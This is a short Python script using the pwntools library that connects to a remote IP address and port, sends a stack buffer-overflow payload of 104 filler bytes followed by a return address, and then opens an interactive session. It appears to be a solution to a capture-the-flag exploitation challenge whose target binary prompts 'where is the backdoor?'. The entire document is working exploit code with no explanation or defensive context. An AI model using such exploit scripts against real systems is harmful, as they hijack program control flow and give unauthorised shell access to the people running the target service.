from pwn import *
context.log_level='debug'
p=remote('8.130.110.158',2100)
payload = 104*b'a'+p64(0x004011B6)
p.sendafter(b'where is the backdoor?',payload)
p.interactive()